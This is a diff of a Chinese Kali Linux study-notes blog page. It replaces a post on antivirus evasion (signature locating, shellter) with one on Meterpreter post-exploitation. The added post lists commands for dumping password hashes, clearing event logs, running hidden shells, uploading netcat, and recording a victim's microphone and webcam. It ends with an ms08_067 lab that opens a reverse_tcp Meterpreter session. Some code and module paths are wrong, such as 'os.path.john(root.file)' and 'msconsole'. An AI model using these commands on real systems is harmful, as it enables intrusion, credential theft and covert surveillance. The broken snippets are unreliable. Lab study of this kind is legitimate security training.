@@ -79,15 +79,15 @@
 
 
 
-<meta name="description" content="1. 精确定位查杀字符串 传统防病毒查杀原理 查找文件体中特殊字符串，匹配则查杀   找到触发AV查杀的精确字符串，并将其修改 找到执行程序分片成很多小片段 将包含MZ头的第一个片段与后续片段一次组合后交给AV查杀 重复以上步骤，最终精确定位 Evade（window程序）、hexeditor（十六进制编辑器）、ghex（图形化界面） 🔺命令：wine evade.exe 🔺命令：open">
+<meta name="description" content="1. Meterpreter 高级、动态、可扩展的Payload（同Nanocode同样的多功能payload） 基于meterpreter上下文利用更多漏洞发起攻击 后渗透测试阶段一站式操作界面   完全基于内存的DLL注入式payload（不写硬盘，硬盘查杀无效果） 注入合法系统进程并建立stager 基于stager上传和预加载DLL进行扩展模块的注入（客户端API） 基于stager建立">
 <meta name="keywords" content="安全">
 <meta property="og:type" content="article">
-<meta property="og:title" content="Kali Linux笔记(九十二)：免杀技术--精确定位查杀字符串">
-<meta property="og:url" content="http:&#x2F;&#x2F;yoursite.com&#x2F;2020&#x2F;02&#x2F;13&#x2F;Kali%20Linux%E7%AC%94%E8%AE%B0(%E4%B9%9D%E5%8D%81%E4%BA%8C)%EF%BC%9A%E5%85%8D%E6%9D%80%E6%8A%80%E6%9C%AF--%E7%B2%BE%E7%A1%AE%E5%AE%9A%E4%BD%8D%E6%9F%A5%E6%9D%80%E5%AD%97%E7%AC%A6%E4%B8%B2&#x2F;index.html">
+<meta property="og:title" content="Kali Linux笔记(一百)：Meterpreter Shell">
+<meta property="og:url" content="http:&#x2F;&#x2F;yoursite.com&#x2F;2020&#x2F;02&#x2F;26&#x2F;Kali%20Linux%E7%AC%94%E8%AE%B0(%E4%B8%80%E7%99%BE)%EF%BC%9AMeterpreter%20Shell&#x2F;index.html">
 <meta property="og:site_name" content="Tomas&#39;Blog">
-<meta property="og:description" content="1. 精确定位查杀字符串 传统防病毒查杀原理 查找文件体中特殊字符串，匹配则查杀   找到触发AV查杀的精确字符串，并将其修改 找到执行程序分片成很多小片段 将包含MZ头的第一个片段与后续片段一次组合后交给AV查杀 重复以上步骤，最终精确定位 Evade（window程序）、hexeditor（十六进制编辑器）、ghex（图形化界面） 🔺命令：wine evade.exe 🔺命令：open">
+<meta property="og:description" content="1. Meterpreter 高级、动态、可扩展的Payload（同Nanocode同样的多功能payload） 基于meterpreter上下文利用更多漏洞发起攻击 后渗透测试阶段一站式操作界面   完全基于内存的DLL注入式payload（不写硬盘，硬盘查杀无效果） 注入合法系统进程并建立stager 基于stager上传和预加载DLL进行扩展模块的注入（客户端API） 基于stager建立">
 <meta property="og:locale" content="zh-Hans">
-<meta property="og:updated_time" content="2020-02-13T13:05:21.480Z">
+<meta property="og:updated_time" content="2020-02-26T07:34:01.610Z">
 <meta name="twitter:card" content="summary">
 
 
@@ -118,13 +118,13 @@
 
 
 
-  <link rel="canonical" href="http://yoursite.com/2020/02/13/Kali Linux笔记(九十二)：免杀技术--精确定位查杀字符串/"/>
+  <link rel="canonical" href="http://yoursite.com/2020/02/26/Kali Linux笔记(一百)：Meterpreter Shell/"/>
 
 
 
 
 
-  <title>Kali Linux笔记(九十二)：免杀技术--精确定位查杀字符串 | Tomas'Blog</title>
+  <title>Kali Linux笔记(一百)：Meterpreter Shell | Tomas'Blog</title>
   
 
 
@@ -243,7 +243,7 @@
   
   
   <div class="post-block">
-    <link itemprop="mainEntityOfPage" href="http://yoursite.com/2020/02/13/Kali%20Linux%E7%AC%94%E8%AE%B0(%E4%B9%9D%E5%8D%81%E4%BA%8C)%EF%BC%9A%E5%85%8D%E6%9D%80%E6%8A%80%E6%9C%AF--%E7%B2%BE%E7%A1%AE%E5%AE%9A%E4%BD%8D%E6%9F%A5%E6%9D%80%E5%AD%97%E7%AC%A6%E4%B8%B2/">
+    <link itemprop="mainEntityOfPage" href="http://yoursite.com/2020/02/26/Kali%20Linux%E7%AC%94%E8%AE%B0(%E4%B8%80%E7%99%BE)%EF%BC%9AMeterpreter%20Shell/">
 
     <span hidden itemprop="author" itemscope itemtype="http://schema.org/Person">
       <meta itemprop="name" content="Tomas">
@@ -260,7 +260,7 @@
 
         
         
-          <h1 class="post-title" itemprop="name headline">Kali Linux笔记(九十二)：免杀技术--精确定位查杀字符串</h1>
+          <h1 class="post-title" itemprop="name headline">Kali Linux笔记(一百)：Meterpreter Shell</h1>
         
 
         <div class="post-meta">
@@ -272,8 +272,8 @@
               
                 <span class="post-meta-item-text">发表于</span>
               
-              <time title="创建于" itemprop="dateCreated datePublished" datetime="2020-02-13T21:05:58+08:00">
-                2020-02-13
+              <time title="创建于" itemprop="dateCreated datePublished" datetime="2020-02-26T15:36:20+08:00">
+                2020-02-26
               </time>
             
 
@@ -326,7 +326,7 @@
                   <span class="post-meta-item-text">字数统计&#58;</span>
                 
                 <span title="字数统计">
-                  255 字
+                  960 字
                 </span>
               
 
@@ -342,7 +342,7 @@
                   <span class="post-meta-item-text">阅读时长 &asymp;</span>
                 
                 <span title="阅读时长">
-                  1 分钟
+                  3 分钟
                 </span>
               
             </div>
@@ -364,49 +364,118 @@
 
       
         <hr>
-<h4 id="1-精确定位查杀字符串"><a href="#1-精确定位查杀字符串" class="headerlink" title="1. 精确定位查杀字符串"></a>1. 精确定位查杀字符串</h4><ul>
-<li>传统防病毒查杀原理<ul>
-<li>查找文件体中特殊字符串，匹配则查杀</li>
+<h4 id="1-Meterpreter"><a href="#1-Meterpreter" class="headerlink" title="1. Meterpreter"></a>1. Meterpreter</h4><ul>
+<li>高级、动态、可扩展的Payload（同Nanocode同样的多功能payload）<ul>
+<li>基于meterpreter上下文利用更多漏洞发起攻击</li>
+<li>后渗透测试阶段一站式操作界面</li>
 </ul>
 </li>
-<li>找到触发AV查杀的精确字符串，并将其修改<ul>
-<li>找到执行程序分片成很多小片段</li>
-<li>将包含MZ头的第一个片段与后续片段一次组合后交给AV查杀</li>
-<li>重复以上步骤，最终精确定位</li>
-<li>Evade（window程序）、hexeditor（十六进制编辑器）、ghex（图形化界面）<ul>
-<li><strong><code>🔺命令：wine evade.exe</code></strong></li>
-<li><strong><code>🔺命令：open a file → Select Output</code></strong></li>
-<li><strong><code>🔺命令：hexeditor TestFile_10000.exe</code></strong></li>
+<li>完全基于内存的DLL注入式payload（不写硬盘，硬盘查杀无效果）<ul>
+<li>注入合法系统进程并建立stager</li>
+<li>基于stager上传和预加载DLL进行扩展模块的注入（客户端API）</li>
+<li>基于stager建立的socket连接建立加密的TLS/1.0通信隧道</li>
+<li>利用TLS隧道进一步加载后续扩展模块（避免网络取证）</li>
 </ul>
 </li>
-<li>▲ 2020.2.13无找到evade此工具</li>
+<li>服务端使用C语言编写</li>
+<li>客户端提供基于ruby的全特性API（支持任何语言）</li>
+</ul>
+<h4 id="2-Meterpreter基本命令"><a href="#2-Meterpreter基本命令" class="headerlink" title="2. Meterpreter基本命令"></a>2. Meterpreter基本命令</h4><ul>
+<li><strong><code>🔺命令：help</code></strong>：查看meterpreter可使用的命令</li>
+<li><strong><code>🔺命令：background</code></strong>：回到msfconsole的界面</li>
+<li><strong><code>🔺命令：pwd</code></strong>：可查看到window下的目录路径</li>
+<li><strong><code>🔺命令：cd</code></strong>：进入window下一个目录</li>
+<li><strong><code>🔺命令：dir/ls</code></strong>：查看本目录文件</li>
+<li><strong><code>🔺命令：cat</code></strong>：查看文件内容</li>
+<li><strong><code>🔺命令：mkdir/rmdir</code></strong>：创建/删除一个的目录</li>
+<li><strong><code>🔺命令：mv</code></strong>：对文件进行改名</li>
+<li><strong><code>🔺命令：rm</code></strong>：删除一个文件</li>
+<li><strong><code>🔺命令：edit</code></strong>：编辑目标文件</li>
+<li><strong><code>🔺命令：lpwd</code></strong>：local远端机器本地目录</li>
+<li><strong><code>🔺命令：lcd</code></strong>：进入local远端机器本地目录的其他目录</li>
+<li><strong><code>🔺命令：run</code></strong>：前端运行</li>
+<li>⭐ <strong><code>🔺命令：bgrun</code></strong>：后台运行脚本<ul>
+<li>▲ 有大量脚本，enum_ie/enum_share/hashdump等</li>
+</ul>
+</li>
+<li>⭐ <strong><code>🔺命令：clearev</code></strong>：清除目标系统日志<br> -（Win+R → eventvwr → 应用程序/安全性/系统 → 一般会在系统日志留下痕迹）</li>
+<li><strong><code>🔺命令：download</code></strong>：下载文件到本地系统<ul>
+<li><strong><code>🔺命令：upload /usr/share/windows-binaries/nc.exe c:\\windows\\system32</code></strong></li>
+</ul>
+</li>
+<li>⭐ <strong><code>🔺命令：execute -f cmd.exe -i –H</code></strong>：执行一个命令<ul>
+<li>-f：执行的程序</li>
+<li>-i：进行交互性shell</li>
+<li>-H：程序进行隐藏</li>
+</ul>
+</li>
+<li><strong><code>🔺命令：getuid</code></strong>：查看登陆的账号</li>
+<li><strong><code>🔺命令：getsystem</code></strong>：如若账号为非system，则提权为system</li>
+<li><strong><code>🔺命令：getprivs</code></strong>：查看被控机器账号权限</li>
+<li><strong><code>🔺命令：getproxy</code></strong>：获取被控机器浏览器设置的代理</li>
+<li><strong><code>🔺命令：getpid</code></strong>：当前注入的合法进程的PID号</li>
+<li><strong><code>🔺命令：migrate PID</code></strong>：可进行进程迁移</li>
+<li><strong><code>🔺命令：hashdump</code></strong>：dump被控机器账号的hash值<ul>
+<li><strong><code>🔺命令：run post/windows/gather/hashdump</code></strong> </li>
+</ul>
+</li>
+<li><strong><code>🔺命令：sysinfo</code></strong>：系统信息</li>
+<li><strong><code>🔺命令：kill PID</code></strong>：杀死进程，通过PID去杀死</li>
+<li><strong><code>🔺命令：shell</code></strong>：获取操作系统的shell</li>
+<li><strong><code>🔺命令：show_mount</code></strong>：挂载的操作系统分区</li>
+<li>̵<strong><code>🔺命令：search -f autoexec.bat</code></strong>：搜索目录</li>
+<li><strong><code>🔺命令：arp</code></strong>：查看被控机器的arp</li>
+<li><strong><code>🔺命令：netstat</code></strong>：查看被控机器网络连接情况</li>
+<li><strong><code>🔺命令：ifconfig/ipconfig</code></strong>：查看IP情况</li>
+<li><strong><code>🔺命令：route</code></strong>：查看路由表（可添加路由表）</li>
+<li><strong><code>🔺命令：idletime</code></strong>：查看被控机器当前空闲时间</li>
+<li><strong><code>🔺命令：resource</code></strong>：调用外部资源文件，可为可执行的指令文件</li>
+<li><strong><code>🔺命令：record_mic</code></strong>：记录被控机器麦克风的声音</li>
+<li><strong><code>🔺命令： webcam_list</code></strong>：列出被控机器所以的摄像头<ul>
+<li><strong><code>🔺命令：webcam_snap -i 1 -v false</code></strong>（每个一秒钟进行拍照）</li>
 </ul>
 </li>
 </ul>
-<h4 id="2-shellter"><a href="#2-shellter" class="headerlink" title="2. shellter"></a>2. shellter</h4><ul>
-<li>代码混淆</li>
-<li>定制的编码方式</li>
-<li>多态编码</li>
-<li>集成部分msf payload</li>
-<li>目前只支持32位PE程序</li>
-<li>使用正常的exe文件作为模板，将payload代码加入模板内<ul>
-<li>模板程序的功能将失效</li>
+<h4 id="3-Meterpreter-Python扩展"><a href="#3-Meterpreter-Python扩展" class="headerlink" title="3. Meterpreter Python扩展"></a>3. Meterpreter Python扩展</h4><ul>
+<li>2015年11月份，来自社区的贡献</li>
+<li>▲ 无需运行环境，在客户端运行原生python代码</li>
+<li><strong><code>🔺命令：load python</code></strong><ul>
+<li><strong><code>🔺命令：Help</code></strong></li>
+<li><strong><code>🔺命令：python_execute &quot;print (&#39;asdasdas&#39;)&quot;</code></strong> </li>
+<li><strong><code>🔺命令：python_execute &quot;import os; cd = os.getcwd()&quot; -r cd</code></strong> </li>
+<li><strong><code>🔺命令：python_import -f find.py</code></strong>  ▲ 2020.2.26 Command executed without returing a result</li>
 </ul>
 </li>
-<li>▲ 2020.2.13需分片工具分好的PE Target</li>
 </ul>
-<h4 id="3-实验"><a href="#3-实验" class="headerlink" title="3. 实验"></a>3. 实验</h4><ul>
-<li>shellter<ul>
-<li>Auto<ul>
-<li>PE Target</li>
-<li>L（列表）/C（定制）/H（帮助）</li>
-</ul>
-</li>
-<li>Manaual</li>
-<li>Help</li>
+<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line">import os</span><br><span class="line">for root,dirs,files in os.walk(&quot;C:\\&quot;):</span><br><span class="line">    for file in files:</span><br><span class="line">        if file.endswith(&quot;.ini&quot;) and file.startswith(&quot;win&quot;):</span><br><span class="line">            print(os.path.john(root.file))</span><br></pre></td></tr></table></figure>
+
+<h4 id="4-实验"><a href="#4-实验" class="headerlink" title="4. 实验"></a>4. 实验</h4><ul>
+<li>Kali主机<ul>
+<li>网卡方式为Bridge方式，桥接到无线网络，检查网络</li>
 </ul>
 </li>
-<li>查看两个shell的免杀效果（查杀网站）</li>
+<li>Window XP SP3主机<ul>
+<li>网卡方式为Bridge方式，桥接到无线网络，检查网络</li>
+<li>关闭防火墙，<strong><code>🔺命令：ifconfig</code></strong>查看IP地址</li>
+</ul>
+</li>
+<li>Kali主机<ul>
+<li><strong><code>🔺命令：msconsole</code></strong><ul>
+<li><strong><code>🔺命令：use exploit/windows/browser/ms08_067_netapi</code></strong></li>
+<li><strong><code>🔺命令：set RHOST Window Xp的IP</code></strong></li>
+<li><strong><code>🔺命令：set target 34</code></strong></li>
+<li><strong><code>🔺命令：set PAYLOAD windows/meterpreter/reverse_tcp</code></strong></li>
+<li><strong><code>🔺命令：set LHOST Kali的IP</code></strong> </li>
+<li><strong><code>🔺命令：set LPORT 4444</code></strong> </li>
+<li><strong><code>🔺命令：show options</code></strong></li>
+<li><strong><code>🔺命令：exploit -j</code></strong></li>
+<li><strong><code>🔺命令：sessions -l</code></strong></li>
+<li><strong><code>🔺命令：sessions -i 1</code></strong>（进入的是meterpreter的shell）</li>
+<li><strong><code>🔺命令：meterpreter</code></strong></li>
+</ul>
+</li>
+</ul>
+</li>
 </ul>
 
       
@@ -438,8 +507,8 @@
         <div class="post-nav">
           <div class="post-nav-next post-nav-item">
             
-              <a href="/2020/02/13/Kali%20Linux%E7%AC%94%E8%AE%B0(%E4%B9%9D%E5%8D%81%E4%B8%80)%EF%BC%9A%E5%85%8D%E6%9D%80%E6%8A%80%E6%9C%AF--%E8%87%AA%E7%BC%96%E5%86%99shell/" rel="next" title="Kali Linux笔记(九十一)：免杀技术--自编写shell">
-                <i class="fa fa-chevron-left"></i> Kali Linux笔记(九十一)：免杀技术--自编写shell
+              <a href="/2020/02/26/Kali%20Linux%E7%AC%94%E8%AE%B0(%E4%B9%9D%E5%8D%81%E4%B9%9D)%EF%BC%9AMSF--msfcli%E6%8E%A7%E5%88%B6%E5%8F%B0%E5%91%BD%E4%BB%A4/" rel="next" title="Kali Linux笔记(九十八)：MSF--msfcli控制台命令">
+                <i class="fa fa-chevron-left"></i> Kali Linux笔记(九十八)：MSF--msfcli控制台命令
               </a>
             
           </div>
@@ -447,10 +516,6 @@
           <span class="post-nav-divider"></span>
 
           <div class="post-nav-prev post-nav-item">
-            
-              <a href="/2020/02/15/Kali%20Linux%E7%AC%94%E8%AE%B0(%E4%B9%9D%E5%8D%81%E4%B8%89)%EF%BC%9ABackdoor-factory/" rel="prev" title="Kali Linux笔记(九十三)：Backdoor-factory">
-                Kali Linux笔记(九十三)：Backdoor-factory <i class="fa fa-chevron-right"></i>
-              </a>
             
           </div>
         </div>
@@ -620,7 +685,7 @@
             
 
             
-              <div class="post-toc-content"><ol class="nav"><li class="nav-item nav-level-4"><a class="nav-link" href="#1-精确定位查杀字符串"><span class="nav-number">1.</span> <span class="nav-text">1. 精确定位查杀字符串</span></a></li><li class="nav-item nav-level-4"><a class="nav-link" href="#2-shellter"><span class="nav-number">2.</span> <span class="nav-text">2. shellter</span></a></li><li class="nav-item nav-level-4"><a class="nav-link" href="#3-实验"><span class="nav-number">3.</span> <span class="nav-text">3. 实验</span></a></li></ol></div>
+              <div class="post-toc-content"><ol class="nav"><li class="nav-item nav-level-4"><a class="nav-link" href="#1-Meterpreter"><span class="nav-number">1.</span> <span class="nav-text">1. Meterpreter</span></a></li><li class="nav-item nav-level-4"><a class="nav-link" href="#2-Meterpreter基本命令"><span class="nav-number">2.</span> <span class="nav-text">2. Meterpreter基本命令</span></a></li><li class="nav-item nav-level-4"><a class="nav-link" href="#3-Meterpreter-Python扩展"><span class="nav-number">3.</span> <span class="nav-text">3. Meterpreter Python扩展</span></a></li><li class="nav-item nav-level-4"><a class="nav-link" href="#4-实验"><span class="nav-number">4.</span> <span class="nav-text">4. 实验</span></a></li></ol></div>
             
 
           </div>
